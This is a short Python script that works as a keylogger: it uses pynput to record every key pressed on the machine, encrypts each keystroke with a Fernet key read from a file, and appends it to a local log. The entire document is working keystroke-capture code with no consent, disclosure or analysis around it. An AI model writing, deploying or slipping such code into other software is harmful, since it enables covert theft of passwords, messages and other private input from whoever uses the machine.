from pynput import keyboard
from cryptography.fernet import Fernet

# Load AES key
with open("secret.key", "rb") as key_file:
    key = key_file.read()

cipher = Fernet(key)
log_file = "keystrokes_encrypted.log"

def on_press(key):
    try:
        keystroke = key.char
    except AttributeError:
        keystroke = str(key)

    encrypted = cipher.encrypt(keystroke.encode())

    with open(log_file, "ab") as f:  # 'ab' = append binary
        f.write(encrypted + b"\n")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()


